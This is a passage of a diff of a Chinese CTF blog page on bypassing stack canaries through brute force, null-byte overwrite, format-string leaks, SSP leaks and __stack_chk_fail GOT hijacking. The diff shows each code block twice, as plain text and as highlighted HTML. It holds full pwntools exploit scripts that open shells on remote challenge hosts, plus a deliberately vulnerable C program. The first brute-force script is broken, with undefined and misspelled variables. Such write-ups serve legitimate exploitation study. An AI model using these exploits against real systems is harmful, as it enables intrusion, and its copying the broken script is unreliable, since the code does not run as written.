class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="comment">#canary</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  info(<span class="string">f&#x27;No:<span class="subst">&#123;K+<span class="number">1</span>&#125;</span>start,finding...&#x27;</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">     p.send(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>)+cannary+btyes([i]))</span><br><span class="line">     recv = p.recvuntil(<span class="string">b&#x27;welcome\n&#x27;</span>)</span><br><span class="line">     <span class="keyword">if</span> <span class="string">b&quot;have fun&quot;</span> <span class="keyword">in</span> recv:</span><br><span class="line">      cannary += <span class="built_in">bytes</span>([i])</span><br><span class="line">      success(<span class="string">f&quot;canary =&gt; <span class="subst">&#123;canary.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">#return address</span></span><br><span class="line">re_1 = <span class="number">0x29</span></span><br><span class="line">re_2 = <span class="number">0</span></span><br><span class="line">info(<span class="string">&#x27;finding:re_2 ...&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> re_i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">  payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + canary + <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> + p8(re_1) + p8(re_i)</span><br><span class="line"><span class="comment">#p8()将给定的整数转换为单字节的字节串</span></span><br><span class="line">  p.send(payload)</span><br><span class="line">  recv = p.recvuntil(<span class="string">b&quot;welcome\n&quot;</span>)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">b&quot;have fun&quot;</span> <span class="keyword">in</span> recv:</span><br><span class="line">       re_2 = re_i</span><br><span class="line">       success(<span class="string">f&quot;re_2 =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(re_2)&#125;</span>&quot;</span>)</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span>-<span class="number">8</span>) + canary + <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> + p8(re_1 - <span class="number">1</span>) + p8(re_2 - <span class="number">1</span>)<span class="comment">#-1对齐栈</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-p = process(&quot;./fun&quot;)
-#p = remote(&quot;39.106.65.236&quot;, &quot;30687&quot;)
-p.recvuntil(b&#39;welcome\n&#39;) 
-canary = b&#39;\x00&#39;
-#canary
-for k in range(7):
-  info(f&#39;No:&#123;K+1&#125;start,finding...&#39;)
-  for i in range(256):
-     p.send(b&#39;a&#39;*(0x70-8)+cannary+btyes([i]))
-     recv = p.recvuntil(b&#39;welcome\n&#39;)
-     if b&quot;have fun&quot; in recv:
-      cannary += bytes([i])
-      success(f&quot;canary =&gt; &#123;canary.hex()&#125;&quot;)
-      break
-      
-#return address
-re_1 = 0x29
-re_2 = 0
-info(&#39;finding:re_2 ...&#39;)
-for re_i in range(0x100):
-  payload = b&#39;a&#39; * 0x68 + canary + b&#39;A&#39; * 8 + p8(re_1) + p8(re_i)
-#p8()将给定的整数转换为单字节的字节串
-  p.send(payload)
-  recv = p.recvuntil(b&quot;welcome\n&quot;)
-  if b&quot;have fun&quot; in recv:
-       re_2 = re_i
-       success(f&quot;re_2 =&gt; &#123;hex(re_2)&#125;&quot;)
-       break
-payload = b&#39;a&#39; * (0x70-8) + canary + b&#39;A&#39; * 8 + p8(re_1 - 1) + p8(re_2 - 1)#-1对齐栈
-p.send(payload)
-p.interactive()
-</code></pre>
 <h4 id="二、覆盖截断字符（-x00）获取canary"><a href="#二、覆盖截断字符（-x00）获取canary" class="headerlink" title="二、覆盖截断字符（\x00）获取canary"></a>二、覆盖截断字符（\x00）获取canary</h4><p>思路：<br>$构造第一次溢出，覆盖canary的低字节\x00，读出canary的值.<br>$构造第二次溢出，利用获取的canary构造payload，get shell.<br>【babypie】<br>（1）checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628164526442.png" alt="image-20230628164526442"></p>
 <p>（2）IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628170950596.png" alt="image-20230628170950596"></p>
 <p>  两次read溢出</p>
@@ -271,21 +193,8 @@ p.interactive()
 <p>NX打开有可利用的system（”&#x2F;bin&#x2F;sh”）<br>PIE打开后低地址始终不变，可以碰运气（buhsi(●’◡’●)）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628172653111.png" alt="image-20230628172653111"></p>
 <p>canary以\x00结尾（为防止被读出）那我们就溢出覆盖\x00再通过print函数打印出canary<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628173716094.png" alt="image-20230628173716094"></p>
 <p>0x30-0x8 &#x3D; 40，再+1覆盖\x00<br>exp：</p>
-<pre><code class="python">from pwn import*
-#sh = process(&#39;./babypie&#39;)
-sh = remote(&#39;node4.buuoj.cn&#39;,29536)
-payload = b&#39;a&#39; * 0x29
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#sh = process(&#x27;./babypie&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29536</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x29</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#先整canary</span></span><br><span class="line">sh.sendafter(<span class="string">b&#x27;Input your Name:\n&#x27;</span>,payload)</span><br><span class="line">sh.recv(<span class="number">6</span> + <span class="number">40</span>)<span class="comment">#读取6个字节（即程序的回应消息）和40个字节（即程序返回的canary值）</span></span><br><span class="line">canary = u64(sh.recv(<span class="number">8</span>)) &amp; (<span class="number">0xffffffffffffff00</span>)<span class="comment">#末尾清0以保持与程序内部的字节对齐</span></span><br><span class="line">log.success(<span class="string">&#x27;canary:%x \n&#x27;</span>,canary)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">40</span> + p64(canary)  + p64(<span class="number">0</span>)+ <span class="string">b&#x27;\x42&#x27;</span></span><br><span class="line"><span class="comment">#p64(0)将栈上的返回地址替换为0，从而绕过内存保护机制</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
-#先整canary
-sh.sendafter(b&#39;Input your Name:\n&#39;,payload)
-sh.recv(6 + 40)#读取6个字节（即程序的回应消息）和40个字节（即程序返回的canary值）
-canary = u64(sh.recv(8)) &amp; (0xffffffffffffff00)#末尾清0以保持与程序内部的字节对齐
-log.success(&#39;canary:%x \n&#39;,canary)
-payload = b&#39;a&#39; * 40 + p64(canary)  + p64(0)+ b&#39;\x42&#39;
-#p64(0)将栈上的返回地址替换为0，从而绕过内存保护机制
-sh.send(payload)
-sh.interactive()
-</code></pre>
 <h4 id="三、利用格式化字符串获取canary"><a href="#三、利用格式化字符串获取canary" class="headerlink" title="三、利用格式化字符串获取canary"></a><strong>三、利用格式化字符串获取canary</strong></h4><p>格式化字符串可以打印出栈中内容，目标利用此漏洞打印出canary值，再利用溢出进行攻击.<br>【Mary_Morton】<br>（1）checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628202654542.png" alt="image-20230628202654542"></p>
 <p>（2）IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204047171.png" alt="image-20230628204047171"></p>
 <p>快乐<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204121367.png" alt="image-20230628204121367"></p>
@@ -294,38 +203,11 @@ sh.interactive()
 <p>buf与canary距离 0x90 - 0x8 &#x3D; 0x88(136)   2^8+1 &#x3D; 17个内存单元<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628210551449.png" alt="image-20230628210551449"></p>
 <p>canary与printf格式化字符串形参相对偏移为17+6 &#x3D; 23<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628210759817.png" alt="image-20230628210759817"></p>
 <p>exp：</p>
-<pre><code class="python">from pwn import*
-context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
- 
-#p=process(&#39;./mary&#39;)
-p=remote(&quot;61.147.171.105&quot;,63174)
- 
-p.sendlineafter(&quot;battle \n&quot;,&quot;2&quot;)
-p.sendline(&quot;%23$p&quot;)
-tmp=int(p.recv(),16)
-canary=p64(tmp)
- 
-payload=b&quot;a&quot;*(0x88)+canary+p64(0)+p64(0x4008DA)
- 
-p.sendlineafter(&quot;3.&quot;,&quot;1&quot;)
- 
-p.sendline(payload)
-p.interactive()
-</code></pre>
-<h4 id="四、SSP-Leak利用canary"><a href="#四、SSP-Leak利用canary" class="headerlink" title="四、SSP Leak利用canary"></a><strong>四、SSP Leak利用canary</strong></h4><p>思路：<br>$canary检测失败会触发stack_chk_fali函数造成stack smashing（stack smashing protect leak）<br>$stack_chk_fail函数会输出一段报错显示文件名，覆盖文件名指针，从而实现任意读也就是覆盖变量__libc_argv[0]<br>$利用相应函数进行溢出（puts、read、write）得到libcbase 得出关键地址进行攻击</p>
-<pre><code class="c">void __attribute__ ((noreturn)) __stack_chk_fail (void)
-&#123;
-  __fortify_fail (&quot;stack smashing detected&quot;);
-&#125;
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p=process(&#x27;./mary&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&quot;61.147.171.105&quot;</span>,<span class="number">63174</span>)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">&quot;battle \n&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;%23$p&quot;</span>)</span><br><span class="line">tmp=<span class="built_in">int</span>(p.recv(),<span class="number">16</span>)</span><br><span class="line">canary=p64(tmp)</span><br><span class="line"> </span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*(<span class="number">0x88</span>)+canary+p64(<span class="number">0</span>)+p64(<span class="number">0x4008DA</span>)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">&quot;3.&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
-&#123;
-  /* The loop is added only to keep gcc happy.  */
-  while (1)
-    __libc_message (2, &quot;*** %s ***: %s terminatedn&quot;,
-                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);
-&#125;
-</code></pre>
+<h4 id="四、SSP-Leak利用canary"><a href="#四、SSP-Leak利用canary" class="headerlink" title="四、SSP Leak利用canary"></a><strong>四、SSP Leak利用canary</strong></h4><p>思路：<br>$canary检测失败会触发stack_chk_fali函数造成stack smashing（stack smashing protect leak）<br>$stack_chk_fail函数会输出一段报错显示文件名，覆盖文件名指针，从而实现任意读也就是覆盖变量__libc_argv[0]<br>$利用相应函数进行溢出（puts、read、write）得到libcbase 得出关键地址进行攻击</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) __stack_chk_fail (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) internal_function __fortify_fail (<span class="type">const</span> <span class="type">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminatedn&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>覆盖到argv就可输出我们想要的参数（即利用了canary的报错信息）</p>
 <p>不同的libc对于__fortify_fail实现有差异，下面是glibc的实现<br><a target="_blank" rel="noopener" href="https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/debug/fortify_fail.c">github源码：glibc&#x2F;debug&#x2F;fortify_fail.c</a><br>【2018网鼎杯 Guess】<br>(1)checsksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628135719174.png" alt="image-20230628135719174"></p>
 <p>(2)IDA分析<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628142542077.png" alt="image-20230628142542077"></p>
@@ -335,156 +217,37 @@ void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *ms
 <p>gets函数下断点  调试计算偏移0xfc8-0xea0（0x128）【还需进一步深入理解】</p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628161126662.png" alt="image-20230628161126662"></p>
 <p>exp：</p>
-<pre><code class="python">from pwn import *
-from LibcSearcher import *
-context.log_level = &#39;debug&#39;
-elf = ELF(&#39;./GUESS&#39;)
-# libc = ELF(&#39;./libc-2.23.so&#39;)
-io = remote(&#39;node4.buuoj.cn&#39;,27922)
-# io = process(&#39;./GUESS&#39;)
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./GUESS&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27922</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./GUESS&#x27;)</span></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_addr</span>(<span class="params">content</span>):</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(content)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;*** stack smashing detected ***: &#x27;</span>)</span><br><span class="line">    addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># step1: leak puts_addr</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(puts_got)</span><br><span class="line">puts_plt = leak_addr(payload1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_plt-----&gt;&quot;</span> + <span class="built_in">hex</span>(puts_plt))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_plt)</span><br><span class="line">libc_base = puts_plt - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base-----&gt;&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">environ = libc.dump(<span class="string">&#x27;__environ&#x27;</span>) + libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment"># step2: leak environ</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(environ)</span><br><span class="line">environ_addr = leak_addr(payload2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;enviorn in stack-----&gt;&quot;</span> + <span class="built_in">hex</span>(environ_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># step3: leak flag</span></span><br><span class="line">payload3 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(environ_addr-<span class="number">0x168</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Please type your guessing flag\n&#x27;</span>,payload3)</span><br><span class="line"><span class="built_in">print</span>(io.recvline())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-puts_got = elf.got[&#39;puts&#39;]
 
-def leak_addr(content):
-    io.recvline()
-    io.sendline(content)
-    io.recvuntil(&#39;*** stack smashing detected ***: &#39;)
-    addr = u64(io.recv(6).ljust(8,b&#39;\x00&#39;))
-    return addr
 
-# step1: leak puts_addr
-payload1 = b&#39;a&#39;*0x128+p64(puts_got)
-puts_plt = leak_addr(payload1)
-print(&quot;puts_plt-----&gt;&quot; + hex(puts_plt))
-libc = LibcSearcher(&quot;puts&quot;,puts_plt)
-libc_base = puts_plt - libc.dump(&quot;puts&quot;)
-print(&quot;libc_base-----&gt;&quot; + hex(libc_base))
-environ = libc.dump(&#39;__environ&#39;) + libc_base
-
-# step2: leak environ
-payload2 = b&#39;a&#39;*0x128 + p64(environ)
-environ_addr = leak_addr(payload2)
-print(&quot;enviorn in stack-----&gt;&quot; + hex(environ_addr))
-
-# step3: leak flag
-payload3 = b&#39;a&#39;*0x128 + p64(environ_addr-0x168)
-io.sendlineafter(&#39;Please type your guessing flag\n&#39;,payload3)
-print(io.recvline())
-</code></pre>
 <h4 id="五、劫持stack-chk-fail函数泄露canary"><a href="#五、劫持stack-chk-fail函数泄露canary" class="headerlink" title="五、劫持stack_chk_fail函数泄露canary"></a>五、劫持stack_chk_fail函数泄露canary</h4><p>思路：劫持stack_chk_fail，可以修改全局偏移表(GOT)中存储的_stack_chk_fail函数地址，在触发canary检查失败时，跳转到指定的地址继续执行.</p>
 <p>百度杯flagen其实可以做更好的栗子 目前暂未获取到相关文件 以后有机会填坑😊</p>
 <p>有相关文章[(12条消息) [pwn]ROP：三道题讲解花式绕过Canary栈保护_breezeO_o的博客-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/Breeze_CAT/article/details/100086513?ops_request_misc=%7B%22request_id%22:%22168796009416800197015252%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168796009416800197015252&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-100086513-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=%E7%99%BE%E5%BA%A6%E6%9D%AF">https://blog.csdn.net/Breeze_CAT/article/details/100086513?ops_request_misc=%7B%22request%5Fid%22%3A%22168796009416800197015252%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=168796009416800197015252&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-100086513-null-null.142^v88^control_2,239^v2^insert_chatgpt&amp;utm_term=百度杯</a> flagen&amp;spm&#x3D;1018.2226.3001.4187)</p>
 <p>自己整个小简单🤖<br><strong>漏洞代码</strong></p>
-<pre><code class="c">#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;string.h&gt;
-void shell(void)
-&#123;
-    system(&quot;/bin/sh&quot;);
-&#125;
-int main(int argc, char *argv[])
-&#123;
-    setbuf(stdin, NULL);
-    setbuf(stdout, NULL);
-    setbuf(stderr, NULL);
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">175</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">275</span>);#栈溢出</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    char buf[175];
-    read(0, buf, 275);#栈溢出
-    printf(buf);
-    return 0;
-&#125;
-</code></pre>
 <p>要想成功劫持函数修改got表 需关闭relro<br>调用shell函数需要关闭pie</p>
-<pre><code>gcc a.c -m32 -fstack-protector -no-pie -z noexecstack -z norelro -o a
-</code></pre>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc <span class="selector-tag">a</span><span class="selector-class">.c</span> -m32 -fstack-protector -no-pie -z noexecstack -z norelro -o <span class="selector-tag">a</span></span><br></pre></td></tr></table></figure>
+
 <p>exp：</p>
-<pre><code class="python">from pwn import *
-import time
-context(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;)
-sh=process(&#39;a&#39;)
-offset=10
-scf_got=ELF(&#39;a&#39;).got[&#39;__stack_chk_fail&#39;]
-gs_addr=ELF(&#39;a&#39;).sym[&#39;getshell&#39;]
-exp=fmtstr_payload(offset, &#123;scf_got: gs_addr&#125;)
-sh.send(exp+&#39;A&#39;*100)
-sh.interactive()
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">offset=<span class="number">10</span></span><br><span class="line">scf_got=ELF(<span class="string">&#x27;a&#x27;</span>).got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class="line">gs_addr=ELF(<span class="string">&#x27;a&#x27;</span>).sym[<span class="string">&#x27;getshell&#x27;</span>]</span><br><span class="line">exp=fmtstr_payload(offset, &#123;scf_got: gs_addr&#125;)</span><br><span class="line">sh.send(exp+<span class="string">&#x27;A&#x27;</span>*<span class="number">100</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
 <p>乐乐乐<br>找到文件了<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/%601%7D0$_NRN19IS]ZZA9EK_PE.jpg" alt="img"><br>【flagen】<br>got表覆写原理<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628224746293.png" alt="image-20230628224746293"><br>（1）checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628215919448.png" alt="image-20230628215919448"></p>
 <p>（2）IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628220716478.png" alt="image-20230628220716478"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628220912579.png" alt="image-20230628220912579"></p>
 <p>此部分会将输入部分变长（1个字节变成3个字节），其中dest为指向堆缓冲区的指针，在调用leetify()时，其值将被压入栈中，由于该函数存在栈溢出漏洞，攻击者可以利用这个漏洞覆盖掉dest的值为指定地址，在后续调用strcpy()时，实现向任意地址写的目的。<br>我们可以将dest覆盖为stack_chk_fail函数在got表中的地址，达到修改stack_chk_fail函数调用地址的目的，这样后续在调用该函数时，实际上执行的是攻击者的代码。又因为canary存在\x00截断，需寻找合适的函数进行输入.</p>
 <p>还是通过泄露libcbase getshell</p>
-<pre><code class="python">libc=LibcSearcher(&#39;alarm&#39;,alarm)
-system=alarm-libc.dump(&#39;alarm&#39;)+libc.dump(&#39;system&#39;)
-malloc_hook=alarm-libc.dump(&#39;alarm&#39;)+libc.dump(&#39;__malloc_hook&#39;)
-print(&#39;malloc_hook&#39;,hex(malloc_hook))
-p.sendline(&#39;/bin/sh\x00&#39;)
-p.sendline(p32(system))
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">libc=LibcSearcher(<span class="string">&#x27;alarm&#x27;</span>,alarm)</span><br><span class="line">system=alarm-libc.dump(<span class="string">&#x27;alarm&#x27;</span>)+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">malloc_hook=alarm-libc.dump(<span class="string">&#x27;alarm&#x27;</span>)+libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;malloc_hook&#x27;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.sendline(p32(system))</span><br></pre></td></tr></table></figure>
+
 <p>exp：</p>
-<pre><code class="python">from pwn import *
-from LibcSearcher import *
-context.log_level=&#39;debug&#39;
-#context.terminal=[&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]
-elf=ELF(&#39;./flagen&#39;)
-def input(p,input):
-    p.sendlineafter(&#39;: &#39;,&#39;1&#39;)
-    p.sendline(input)
-def up(p):
-    p.sendlineafter(&#39;: &#39;,&#39;2&#39;)
-def low(p):
-    p.sendlineafter(&#39;: &#39;,&#39;3&#39;)
-def change(p):
-    p.sendlineafter(&#39;: &#39;,&#39;4&#39;)
-def addprefix(p):
-    p.sendlineafter(&#39;: &#39;,&#39;5&#39;)
-def prin(p):
-    p.sendlineafter(&#39;: &#39;,&#39;6&#39;)
-def exit(p):
-    p.sendlineafter(&#39;: &#39;,&#39;7&#39;)
-puts=0x08048510
-ret=0x0804846a
-stack_check=0x0804B01C
-pop_1=0x08048481
